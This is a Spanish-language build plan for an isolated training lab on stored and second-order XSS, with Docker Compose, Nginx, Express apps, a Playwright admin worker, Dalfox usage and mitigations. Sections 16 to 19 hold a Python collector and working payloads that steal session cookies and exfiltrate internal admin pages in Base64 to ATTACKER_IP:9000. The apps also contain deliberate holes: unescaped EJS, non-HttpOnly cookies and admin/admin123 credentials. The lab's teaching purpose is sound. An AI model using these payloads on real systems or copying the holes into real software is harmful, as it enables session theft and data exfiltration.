# Plan de desarrollo — Laboratorio Dalfox / Stored XSS con backend interno

## 1. Propósito del laboratorio

Este laboratorio tiene como objetivo demostrar, en un ambiente controlado, que un XSS almacenado en una aplicación pública puede impactar un sistema interno que consume los datos de esa aplicación.

La demo debe mostrar tres ideas centrales:

1. Un formulario público aparentemente inocente puede ser usado como punto de entrada.
2. El payload queda almacenado y se ejecuta después, cuando un usuario privilegiado procesa el contenido.
3. Aunque el atacante no pueda acceder directamente al backend interno, puede usar el navegador del usuario privilegiado como puente para obtener información interna.

El laboratorio se construirá para ser utilizado junto con Dalfox como herramienta de apoyo para detección de XSS.

---

## 2. Alcance y límites

Este laboratorio debe ejecutarse únicamente en una red controlada, sin exposición a Internet.

No debe usarse contra terceros, sistemas reales ni redes ajenas.

El diseño incluye vulnerabilidades intencionales:

- renderizado inseguro de datos no confiables;
- cookie de sesión accesible por JavaScript;
- ausencia inicial de CSP;
- procesamiento automático de mensajes por un usuario privilegiado simulado.

Estas debilidades existen solo para fines didácticos y deben quedar documentadas como tales.

---

## 3. Escenario general

Habrá dos máquinas:

| Máquina | Rol | Ejemplo de IP |
|---|---|---|
| Máquina laboratorio | Docker host donde corren las apps | `192.168.56.10` |
| Máquina atacante | Navegador atacante + servidor Python receptor | `192.168.56.20` |

Los nombres simulados serán:

| Dominio | Rol | Accesible desde atacante |
|---|---|---|
| `cross.fit` | App pública / landing del gimnasio | Sí |
| `backend.cross.fit` | App privada / panel interno | No directamente |

> Nota: `.fit` es un TLD real. Para un laboratorio aislado puede usarse mediante `/etc/hosts`, pero en documentación técnica general sería más seguro usar `.test`. En este laboratorio se mantiene `cross.fit` por requerimiento del escenario.

---

## 4. Arquitectura de alto nivel

```text
Máquina atacante
192.168.56.20
   |
   | HTTP hacia http://cross.fit
   v
Máquina laboratorio / Docker host
192.168.56.10
   |
   +-- public-proxy      expuesto en puerto 80 del host
   |      - acepta cross.fit
   |      - rechaza backend.cross.fit y cualquier otro Host
   |
   +-- public-app        landing pública del gimnasio
   |
   +-- internal-proxy    sin puertos publicados
   |      - alias Docker: backend.cross.fit
   |      - enruta hacia internal-app
   |
   +-- internal-app      panel administrativo privado
   |
   +-- worker            Playwright autenticado como admin
   |
   +-- db                PostgreSQL compartida
```

Diseño clave:

- La máquina atacante solo puede llegar al puerto 80 del `public-proxy`.
- `public-proxy` solo debe aceptar `Host: cross.fit`.
- `backend.cross.fit` no debe estar publicado hacia el host.
- El `worker` accede a `backend.cross.fit` dentro de la red Docker mediante `internal-proxy`.
- El XSS se ejecuta en el navegador Playwright del `worker`, autenticado como admin.

---

## 5. Flujo de ataque esperado

```text
1. El atacante accede a http://cross.fit desde su máquina.
2. Envía un formulario de contacto con payload XSS.
3. public-app guarda el mensaje en PostgreSQL.
4. worker abre periódicamente http://backend.cross.fit como admin.
5. internal-app renderiza el mensaje sin escape.
6. El payload se ejecuta en el navegador privilegiado.
7. El payload envía información hacia el servidor Python del atacante.
```

---

## 6. Stack recomendado

| Componente | Tecnología |
|---|---|
| App pública | Node.js + Express + EJS |
| App interna | Node.js + Express + EJS |
| Worker automático | Node.js + Playwright |
| Base de datos | PostgreSQL |
| Reverse proxy público | Nginx |
| Reverse proxy interno | Nginx |
| Servidor receptor atacante | Python `http.server` custom |
| Orquestación | Docker Compose |

Motivo de usar EJS:

- permite mostrar claramente la diferencia entre salida escapada y salida cruda;
- facilita construir una vulnerabilidad didáctica con `<%- message.message %>`;
- facilita corregir el problema cambiando a `<%= message.message %>`.

---

## 7. Estructura esperada del repositorio

```text
dalfox-xss-lab/
├── README.md
├── docker-compose.yml
├── .env.example
├── db/
│   └── init.sql
├── nginx/
│   ├── public.conf
│   └── internal.conf
├── public-app/
│   ├── Dockerfile
│   ├── package.json
│   └── src/
│       ├── app.js
│       ├── db.js
│       └── views/
│           ├── index.ejs
│           └── thanks.ejs
├── internal-app/
│   ├── Dockerfile
│   ├── package.json
│   └── src/
│       ├── app.js
│       ├── db.js
│       ├── auth.js
│       └── views/
│           ├── login.ejs
│           ├── dashboard.ejs
│           ├── messages.ejs
│           └── message-detail.ejs
├── worker/
│   ├── Dockerfile
│   ├── package.json
│   └── src/
│       └── worker.js
└── tools/
    └── collector.py
```

---

## 8. Modelo de base de datos

Archivo:

```text
db/init.sql
```

Contenido esperado:

```sql
CREATE TABLE IF NOT EXISTS contact_messages (
    id SERIAL PRIMARY KEY,
    full_name TEXT NOT NULL,
    email TEXT NOT NULL,
    phone TEXT,
    message TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'new',
    created_at TIMESTAMP NOT NULL DEFAULT now(),
    processed_at TIMESTAMP
);

CREATE TABLE IF NOT EXISTS internal_users (
    id SERIAL PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    role TEXT NOT NULL DEFAULT 'operator'
);

INSERT INTO internal_users (username, password, role)
VALUES ('admin', 'admin123', 'admin')
ON CONFLICT (username) DO NOTHING;
```

Estados de mensajes:

| Estado | Significado |
|---|---|
| `new` | Mensaje recién recibido |
| `processing` | Mensaje tomado por el worker |
| `processed` | Mensaje ya visualizado/procesado |
| `flagged` | Mensaje marcado manualmente |

---

## 9. Docker Compose

Archivo:

```text
docker-compose.yml
```

Diseño esperado:

```yaml
services:
  public-proxy:
    image: nginx:1.27-alpine
    container_name: xsslab-public-proxy
    ports:
      - "80:80"
    volumes:
      - ./nginx/public.conf:/etc/nginx/conf.d/default.conf:ro
    depends_on:
      - public-app
    networks:
      - lab_net

  internal-proxy:
    image: nginx:1.27-alpine
    container_name: xsslab-internal-proxy
    volumes:
      - ./nginx/internal.conf:/etc/nginx/conf.d/default.conf:ro
    depends_on:
      - internal-app
    networks:
      lab_net:
        aliases:
          - backend.cross.fit

  public-app:
    build: ./public-app
    container_name: xsslab-public-app
    environment:
      DATABASE_URL: postgres://gym:gym_pass@db:5432/gym_lab
      PUBLIC_PORT: 3000
    expose:
      - "3000"
    depends_on:
      - db
    networks:
      - lab_net

  internal-app:
    build: ./internal-app
    container_name: xsslab-internal-app
    environment:
      DATABASE_URL: postgres://gym:gym_pass@db:5432/gym_lab
      INTERNAL_PORT: 3001
      SESSION_SECRET: lab_secret
      ADMIN_USER: admin
      ADMIN_PASS: admin123
      COOKIE_HTTPONLY: "false"
    expose:
      - "3001"
    depends_on:
      - db
    networks:
      - lab_net

  worker:
    build: ./worker
    container_name: xsslab-worker
    environment:
      INTERNAL_BASE_URL: http://backend.cross.fit
      ADMIN_USER: admin
      ADMIN_PASS: admin123
      POLL_INTERVAL_SECONDS: 20
    depends_on:
      - internal-proxy
      - internal-app
    networks:
      - lab_net

  db:
    image: postgres:16
    container_name: xsslab-db
    environment:
      POSTGRES_DB: gym_lab
      POSTGRES_USER: gym
      POSTGRES_PASSWORD: gym_pass
    volumes:
      - db_data:/var/lib/postgresql/data
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql:ro
    networks:
      - lab_net

volumes:
  db_data:

networks:
  lab_net:
    ipam:
      config:
        - subnet: 172.28.0.0/16
```

Puntos importantes:

- `public-app` no publica puertos.
- `internal-app` no publica puertos.
- `internal-proxy` no publica puertos.
- Solo `public-proxy` publica `80:80`.
- `backend.cross.fit` existe solo como alias interno Docker asociado a `internal-proxy`.

---

## 10. Configuración Nginx pública

Archivo:

```text
nginx/public.conf
```

Contenido esperado:

```nginx
server {
    listen 80;
    server_name cross.fit;

    location / {
        proxy_pass http://public-app:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

server {
    listen 80 default_server;
    server_name _;

    return 444;
}
```

Objetivo:

- Permitir solamente `Host: cross.fit`.
- Rechazar `backend.cross.fit`.
- Rechazar acceso por IP directa.
- Rechazar cualquier host no esperado.

Prueba esperada desde la máquina atacante:

```bash
curl -i http://cross.fit/
```

Debe devolver la landing pública.

Prueba esperada contra el backend:

```bash
curl -i -H "Host: backend.cross.fit" http://192.168.56.10/
```

Debe devolver conexión cerrada, error o respuesta no exitosa.

---

## 11. Configuración Nginx interna

Archivo:

```text
nginx/internal.conf
```

Contenido esperado:

```nginx
server {
    listen 80;
    server_name backend.cross.fit;

    location / {
        proxy_pass http://internal-app:3001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

server {
    listen 80 default_server;
    server_name _;

    return 444;
}
```

Este proxy no debe publicar puertos al host.

Validación desde el contenedor worker:

```bash
docker exec -it xsslab-worker sh
wget -S -O- http://backend.cross.fit/login
```

Debe devolver `200 OK`.

Validación desde la máquina atacante:

```bash
curl -i http://backend.cross.fit/
```

No debe resolver o no debe conectar, salvo que el atacante agregue el dominio a `/etc/hosts`.

Incluso si el atacante agrega el dominio a `/etc/hosts` apuntando a `192.168.56.10`, debe seguir sin acceder al backend porque el puerto 80 publicado pertenece al `public-proxy`, que rechaza `backend.cross.fit`.

---

## 12. Resolución por `/etc/hosts`

### En la máquina atacante

Agregar solo:

```text
192.168.56.10   cross.fit
```

No agregar:

```text
192.168.56.10   backend.cross.fit
```

Validar:

```bash
getent hosts cross.fit
```

Debe devolver:

```text
192.168.56.10   cross.fit
```

### En la máquina laboratorio

No es estrictamente necesario configurar `/etc/hosts` para Docker, porque `backend.cross.fit` se resuelve mediante alias de red Docker.

Opcionalmente, para pruebas locales de la landing pública:

```text
127.0.0.1   cross.fit
```

No agregar `backend.cross.fit` al host, para mantener clara la separación.

---

## 13. public-app

### Función

Simular una landing pública de un gimnasio llamado `CrossFit Atlas`.

Debe tener:

- página principal;
- formulario de contacto;
- confirmación de envío;
- estilo simple y visualmente presentable.

### Endpoints

| Método | Ruta | Descripción |
|---|---|---|
| GET | `/` | Landing pública |
| POST | `/contact` | Guarda mensaje de contacto |
| GET | `/health` | Healthcheck |

### Campos del formulario

| Campo | Requerido |
|---|---|
| `full_name` | Sí |
| `email` | Sí |
| `phone` | No |
| `message` | Sí |

### Requisito vulnerable intencional

La app pública no debe sanitizar ni bloquear HTML/JS en el campo `message`.

Debe guardar el mensaje tal cual llega:

```js
await db.query(
  `INSERT INTO contact_messages (full_name, email, phone, message)
   VALUES ($1, $2, $3, $4)`,
  [full_name, email, phone, message]
);
```

Esto es intencional para el laboratorio.

---

## 14. internal-app

### Función

Simular un panel administrativo interno usado por personal del gimnasio.

Debe tener:

- login;
- dashboard;
- listado de mensajes;
- detalle de mensaje;
- endpoint para abrir el próximo mensaje nuevo;
- botón para marcar mensaje como procesado.

### Endpoints

| Método | Ruta | Auth | Descripción |
|---|---|---|---|
| GET | `/login` | No | Formulario de login |
| POST | `/login` | No | Autenticación |
| POST | `/logout` | Sí | Cierre de sesión |
| GET | `/admin` | Sí | Dashboard |
| GET | `/admin/messages` | Sí | Lista todos los mensajes |
| GET | `/admin/messages/next` | Sí | Abre el próximo mensaje `new` |
| GET | `/admin/messages/:id` | Sí | Detalle del mensaje |
| POST | `/admin/messages/:id/process` | Sí | Marca como procesado |
| GET | `/health` | No | Healthcheck |

### Credenciales internas de laboratorio

```text
Usuario: admin
Contraseña: admin123
Rol: admin
```

No almacenar passwords de forma segura en esta primera versión. Es un laboratorio didáctico. En el README se debe aclarar que en sistemas reales debe usarse hashing de contraseñas.

### Cookie de sesión vulnerable

Configurar `express-session` con cookie legible por JavaScript:

```js
app.use(session({
  name: 'gym_internal_session',
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: process.env.COOKIE_HTTPONLY === 'true',
    sameSite: 'lax',
    secure: false
  }
}));
```

En modo vulnerable:

```env
COOKIE_HTTPONLY=false
```

Esto permitirá demostrar:

```js
document.cookie
```

En la fase de mitigación, cambiar a:

```env
COOKIE_HTTPONLY=true
```

### Vista vulnerable

Archivo:

```text
internal-app/src/views/message-detail.ejs
```

La vista debe renderizar el campo `message` como HTML crudo:

```ejs
<div class="message-box">
  <%- message.message %>
</div>
```

Esta es la vulnerabilidad principal.

La versión corregida será:

```ejs
<div class="message-box">
  <%= message.message %>
</div>
```

### Vista de todos los mensajes

Archivo:

```text
internal-app/src/views/messages.ejs
```

Debe mostrar una tabla con:

| Columna |
|---|
| ID |
| Fecha |
| Nombre |
| Email |
| Teléfono |
| Mensaje |
| Estado |

Esta ruta será el objetivo del segundo payload:

```text
/admin/messages
```

---

## 15. worker

### Función

Simular un proceso interno automático que revisa mensajes nuevos como usuario privilegiado.

El worker debe usar Playwright con Chromium headless.

No debe leer la base de datos directamente para procesar mensajes. Debe comportarse como un usuario real:

1. Abrir navegador.
2. Entrar a `http://backend.cross.fit/login`.
3. Autenticarse como `admin`.
4. Cada `POLL_INTERVAL_SECONDS`:
   - abrir `/admin/messages/next`;
   - esperar 2–3 segundos;
   - si hay mensaje nuevo, dejar que la página renderice el contenido;
   - marcarlo como procesado si existe botón disponible.

### Pseudocódigo

```js
const { chromium } = require('playwright');

const baseUrl = process.env.INTERNAL_BASE_URL;
const username = process.env.ADMIN_USER;
const password = process.env.ADMIN_PASS;
const interval = Number(process.env.POLL_INTERVAL_SECONDS || 20) * 1000;

async function login(page) {
  await page.goto(`${baseUrl}/login`, { waitUntil: 'networkidle' });
  await page.fill('input[name="username"]', username);
  await page.fill('input[name="password"]', password);
  await page.click('button[type="submit"]');
  await page.waitForURL(`${baseUrl}/admin`);
}

async function processMessages(page) {
  while (true) {
    await page.goto(`${baseUrl}/admin/messages/next`, {
      waitUntil: 'networkidle'
    });

    await page.waitForTimeout(3000);

    const button = await page.$('form[data-process-message] button');
    if (button) {
      await button.click();
      await page.waitForTimeout(1000);
    }

    await page.waitForTimeout(interval);
  }
}

(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();

  page.on('console', msg => {
    console.log(`[browser console] ${msg.type()}: ${msg.text()}`);
  });

  page.on('pageerror', err => {
    console.error(`[browser error] ${err.message}`);
  });

  await login(page);
  await processMessages(page);
})();
```

### Punto didáctico

El worker debe usar navegador real porque el JavaScript del XSS no se ejecutaría si el procesamiento fuera solo con SQL, `curl`, jobs backend o lectura directa de la base de datos.

---

## 16. Servidor Python receptor en la máquina atacante

No se debe crear una app receptora en Docker.

La máquina atacante debe levantar manualmente un servidor Python.

Archivo:

```text
tools/collector.py
```

Contenido:

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import base64

HOST = "0.0.0.0"
PORT = 9000


class CollectorHandler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        print("\n=== GET recibido ===")
        print(f"Fecha: {datetime.now().isoformat()}")
        print(f"Path: {parsed.path}")
        print(f"Cliente: {self.client_address[0]}")
        print(f"Query: {params}")

        if "c" in params:
            print("\n[Cookie capturada]")
            print(params["c"][0])

        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(length).decode("utf-8", errors="replace")

        print("\n=== POST recibido ===")
        print(f"Fecha: {datetime.now().isoformat()}")
        print(f"Path: {self.path}")
        print(f"Cliente: {self.client_address[0]}")
        print(f"Body crudo:\n{raw_body}")

        try:
            decoded = base64.b64decode(raw_body).decode("utf-8", errors="replace")
            print("\n[Body decodificado como Base64]")
            print(decoded)
        except Exception as exc:
            print("\n[No se pudo decodificar como Base64]")
            print(str(exc))

        self.send_response(204)
        self._cors()
        self.end_headers()


if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), CollectorHandler)
    print(f"Servidor escuchando en http://{HOST}:{PORT}")
    server.serve_forever()
```

Ejecutar en la máquina atacante:

```bash
python3 tools/collector.py
```

Debe escuchar en:

```text
0.0.0.0:9000
```

---

## 17. Payloads del laboratorio

En los ejemplos, reemplazar:

```text
ATTACKER_IP
```

por la IP real de la máquina atacante, por ejemplo:

```text
192.168.56.20
```

### 17.1 Payload visual simple

Objetivo: demostrar ejecución de JavaScript en el backend interno.

```html
<script>alert('XSS ejecutado en backend.cross.fit')</script>
```

Resultado esperado:

- el alert se dispara en el navegador Playwright;
- el mensaje puede verse en logs del worker si se agregan eventos de consola o screenshots.

---

### 17.2 Payload para robar cookie de sesión

Objetivo: demostrar que una cookie sin `HttpOnly` puede ser leída por JavaScript.

```html
<img src=x onerror="new Image().src='http://ATTACKER_IP:9000/collect?c='+encodeURIComponent(document.cookie)">
```

Ejemplo:

```html
<img src=x onerror="new Image().src='http://192.168.56.20:9000/collect?c='+encodeURIComponent(document.cookie)">
```

Resultado esperado en `collector.py`:

```text
=== GET recibido ===
Path: /collect
Query: {'c': ['gym_internal_session=...']}
```

Observación didáctica:

En este diseño, el atacante no debería poder usar esa cookie para entrar directamente al backend porque `backend.cross.fit` no está accesible desde su máquina. Esto es correcto y refuerza la idea de segmentación.

---

### 17.3 Payload para exfiltrar `/admin/messages`

Objetivo: demostrar que, aunque el atacante no pueda acceder directamente al backend, el navegador privilegiado sí puede hacerlo y enviar la respuesta al atacante.

```html
<script>
fetch('/admin/messages', { credentials: 'include' })
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));

    fetch('http://ATTACKER_IP:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'text/plain'
      },
      body: b64
    });
  });
</script>
```

Ejemplo:

```html
<script>
fetch('/admin/messages', { credentials: 'include' })
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));

    fetch('http://192.168.56.20:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'text/plain'
      },
      body: b64
    });
  });
</script>
```

Resultado esperado en `collector.py`:

```text
=== POST recibido ===
Path: /internal-html
Body crudo:
PGh0bWw+...

[Body decodificado como Base64]
<!DOCTYPE html>
<html>
...
<table>
...
</table>
```

### 17.4 Nota sobre Base64 y caracteres no ASCII

No usar simplemente:

```js
btoa(html)
```

Puede fallar con tildes, eñes u otros caracteres no ASCII.

Usar:

```js
btoa(unescape(encodeURIComponent(html)))
```

En Python, decodificar con:

```python
base64.b64decode(raw_body).decode("utf-8", errors="replace")
```

---

## 18. Inserción de payloads por formulario

El atacante debe acceder a:

```text
http://cross.fit
```

Desde ahí envía el formulario de contacto.

Campos sugeridos:

```text
Nombre: Alumno XSS
Email: xss@example.com
Teléfono: 099000000
Mensaje: <payload>
```

---

## 19. Inserción de payloads por curl

Desde la máquina atacante:

### Mensaje legítimo

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Juan Perez" \
  -d "email=juan@example.com" \
  -d "phone=099123456" \
  -d "message=Quiero informacion sobre planes mensuales"
```

### Cookie theft

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS" \
  -d "email=xss@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://ATTACKER_IP:9000/collect?c='+encodeURIComponent(document.cookie)\">"
```

### Exfiltración de `/admin/messages`

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS 2" \
  -d "email=xss2@example.com" \
  -d "phone=099000001" \
  --data-urlencode "message=<script>
fetch('/admin/messages', { credentials: 'include' })
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://ATTACKER_IP:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>"
```

---

## 20. Uso de Dalfox

Dalfox puede usarse para mostrar detección de XSS en la app pública.

### Caso POST

Ejemplo base:

```bash
dalfox url "http://cross.fit/contact" \
  -X POST \
  -d "full_name=Test&email=test@example.com&phone=123&message=INJECT_HERE"
```

Según cómo se implemente el formulario, puede ser necesario ajustar el parámetro de inyección.

### Recomendación didáctica

Para evitar que la clase dependa exclusivamente del comportamiento de Dalfox con stored XSS, se puede agregar una ruta auxiliar vulnerable en la app pública:

```text
GET /preview?message=
```

Esa ruta debe reflejar el parámetro `message` de forma insegura para mostrar detección rápida con Dalfox.

Ejemplo:

```bash
dalfox url "http://cross.fit/preview?message=FUZZ"
```

La ruta `/preview` debe marcarse claramente como auxiliar de demostración y no como parte principal del escenario.

---

## 21. Secuencia sugerida para la clase

### Fase 1 — Presentar el flujo legítimo

1. Levantar contenedores.
2. Configurar `/etc/hosts` en máquina atacante.
3. Abrir `http://cross.fit`.
4. Enviar mensaje legítimo.
5. Mostrar logs del worker procesando mensajes.

### Fase 2 — Mostrar aislamiento del backend

Desde la máquina atacante:

```bash
curl -i -H "Host: backend.cross.fit" http://192.168.56.10/
```

Resultado esperado:

- no debe devolver el panel interno;
- debe devolver error, cierre de conexión o respuesta no exitosa.

### Fase 3 — Mostrar XSS visual

Enviar:

```html
<script>alert('XSS ejecutado en backend.cross.fit')</script>
```

Explicar que el script no corre en la app pública, sino en el backend interno cuando el admin procesa el mensaje.

### Fase 4 — Robar cookie

1. Levantar servidor Python en la máquina atacante.
2. Enviar payload de cookie.
3. Ver la cookie en la consola de `collector.py`.

### Fase 5 — Exfiltrar HTML interno

1. Enviar payload de `/admin/messages`.
2. Ver el POST recibido.
3. Mostrar el HTML decodificado.
4. Explicar que el atacante nunca accedió directamente al backend.

### Fase 6 — Mitigar

Aplicar controles:

- escaping de salida;
- cookie `HttpOnly`;
- CSP;
- segmentación y control de exposición;
- validación/sanitización si corresponde.

### Fase 7 — Repetir payloads

Validar que:

- no se ejecuta JavaScript;
- no se roba cookie;
- no se exfiltra `/admin/messages`;
- la app sigue funcionando para mensajes legítimos.

---

## 22. Validaciones de infraestructura

### En el Docker host

Levantar:

```bash
docker compose up --build
```

Verificar:

```bash
docker compose ps
```

Esperado:

```text
xsslab-public-proxy     running
xsslab-internal-proxy   running
xsslab-public-app       running
xsslab-internal-app     running
xsslab-worker           running
xsslab-db               running
```

Ver puertos publicados:

```bash
ss -ltnp
```

Esperado:

```text
0.0.0.0:80
```

No deben estar publicados:

```text
:3000
:3001
:5432
```

### Desde la máquina atacante

Validar app pública:

```bash
curl -i http://cross.fit/
```

Validar que backend no es accesible:

```bash
curl -i -H "Host: backend.cross.fit" http://192.168.56.10/
```

### Desde el worker

Validar backend interno:

```bash
docker exec -it xsslab-worker sh
wget -S -O- http://backend.cross.fit/login
```

Debe devolver `200 OK`.

---

## 23. Mitigaciones a implementar al final

### 23.1 Escape de salida

Cambiar:

```ejs
<%- message.message %>
```

por:

```ejs
<%= message.message %>
```

Resultado esperado:

- el payload aparece como texto;
- no se ejecuta JavaScript.

### 23.2 Cookie `HttpOnly`

Cambiar:

```env
COOKIE_HTTPONLY=false
```

por:

```env
COOKIE_HTTPONLY=true
```

Resultado esperado:

```js
document.cookie
```

ya no expone `gym_internal_session`.

### 23.3 CSP restrictiva

Agregar en `internal-app`:

```js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"
  );
  next();
});
```

Resultado esperado:

- scripts inline bloqueados;
- eventos inline como `onerror` bloqueados;
- exfiltración por payload inline bloqueada.

### 23.4 Sanitización si se quiere permitir HTML limitado

Si el campo `message` aceptara formato enriquecido, usar sanitización con allowlist.

Permitir como máximo:

```text
b, i, strong, em, p, br
```

No permitir:

```text
script, iframe, object, embed, svg, math
onerror, onclick, onload
javascript:
data:
```

### 23.5 Segmentación

Mantener:

- `internal-app` sin puertos publicados;
- `internal-proxy` sin puertos publicados;
- `public-proxy` rechazando hosts no esperados;
- backend resoluble solo dentro de Docker.

---

## 24. Criterios de aceptación para Codex

Codex debe entregar un repositorio funcional que cumpla:

### Infraestructura

- `docker compose up --build` levanta todo.
- Solo se publica el puerto `80`.
- `cross.fit` muestra la landing pública.
- `backend.cross.fit` no es accesible desde la máquina atacante.
- `backend.cross.fit` sí es accesible desde `worker`.

### App pública

- Muestra landing de gimnasio.
- Tiene formulario de contacto.
- Guarda mensajes en PostgreSQL.
- No sanitiza intencionalmente `message`.

### App interna

- Tiene login.
- Usuario `admin/admin123`.
- Tiene dashboard.
- Lista mensajes.
- Muestra detalle de mensaje.
- Renderiza `message` con `<%- message.message %>` en modo vulnerable.
- Permite marcar mensajes como procesados.

### Worker

- Usa Playwright.
- Inicia sesión como admin.
- Procesa mensajes automáticamente.
- Ejecuta los scripts almacenados al renderizar mensajes.

### Exfiltración de laboratorio

- Payload de cookie llega al servidor Python.
- Payload de `/admin/messages` llega por POST en Base64.
- `collector.py` decodifica y muestra el HTML interno.

### Mitigación

- README explica cómo corregir.
- README muestra cómo validar que la corrección funciona.
- Debe existir una forma simple de cambiar entre modo vulnerable y mitigado.

---

## 25. Prompt sugerido para Codex

```text
Construye un laboratorio Docker Compose llamado dalfox-xss-lab para demostrar stored XSS/second-order XSS en un entorno controlado.

Arquitectura:
- Máquina atacante separada.
- Docker host con public-proxy, internal-proxy, public-app, internal-app, worker y PostgreSQL.
- Solo public-proxy debe publicar puerto 80.
- public-proxy debe aceptar únicamente Host cross.fit y rechazar cualquier otro host.
- internal-proxy no debe publicar puertos y debe tener alias Docker backend.cross.fit.
- worker debe acceder a http://backend.cross.fit.

Servicios:
1. public-app:
   - Node.js + Express + EJS.
   - Landing de gimnasio CrossFit Atlas.
   - Formulario de contacto con full_name, email, phone y message.
   - Guarda mensajes en PostgreSQL.
   - No sanitiza intencionalmente el campo message.

2. internal-app:
   - Node.js + Express + EJS.
   - Login admin/admin123.
   - express-session con cookie gym_internal_session.
   - COOKIE_HTTPONLY configurable por variable de entorno.
   - Dashboard /admin.
   - /admin/messages lista todos los mensajes.
   - /admin/messages/next abre el próximo mensaje new.
   - /admin/messages/:id muestra detalle.
   - El detalle debe renderizar message con EJS <%- message.message %> para que sea vulnerable.
   - Debe incluir comentarios claros indicando que esto es inseguro e intencional para el laboratorio.

3. worker:
   - Node.js + Playwright.
   - Inicia sesión como admin en http://backend.cross.fit.
   - Cada 20 segundos abre /admin/messages/next.
   - Espera 3 segundos y marca el mensaje como procesado.
   - Debe registrar logs claros.

4. db:
   - PostgreSQL 16.
   - init.sql con tablas contact_messages e internal_users.

5. tools/collector.py:
   - Servidor Python manual para ejecutar en la máquina atacante.
   - Escucha en 0.0.0.0:9000.
   - Recibe GET /collect?c=...
   - Recibe POST /internal-html con body Base64.
   - Decodifica y muestra el contenido.

README:
- Instrucciones de /etc/hosts.
- Cómo levantar el laboratorio.
- Cómo validar que backend.cross.fit no es accesible desde atacante.
- Cómo levantar collector.py.
- Payload de alert.
- Payload de robo de cookie.
- Payload para leer /admin/messages y enviarlo en Base64.
- Cómo ejecutar Dalfox contra la app pública.
- Cómo mitigar: cambiar <%- %> por <%= %>, activar HttpOnly, agregar CSP.
- Cómo validar la mitigación.
```

---

## 26. Referencias técnicas para el README

Agregar una sección de referencias:

```text
- OWASP Cross-Site Scripting:
  https://owasp.org/www-community/attacks/xss/

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

- MDN HTTP Cookies / HttpOnly:
  https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies

- Docker Compose Networking:
  https://docs.docker.com/compose/how-tos/networking/

- Nginx access / allow / deny:
  https://nginx.org/en/docs/http/ngx_http_access_module.html
```

---

## 27. Resultado didáctico esperado

Al finalizar la clase, los participantes deberían poder explicar:

1. Qué es un stored XSS.
2. Qué es un second-order XSS.
3. Por qué una app pública puede comprometer un backend interno.
4. Por qué un proceso automático con navegador real puede disparar XSS.
5. Por qué `HttpOnly` reduce el impacto pero no soluciona XSS por completo.
6. Por qué el escape contextual de salida es el control principal.
7. Por qué la segmentación de red no reemplaza la sanitización y el encoding.
8. Cómo una herramienta como Dalfox ayuda a detectar vectores, pero no sustituye el análisis del flujo completo de negocio.
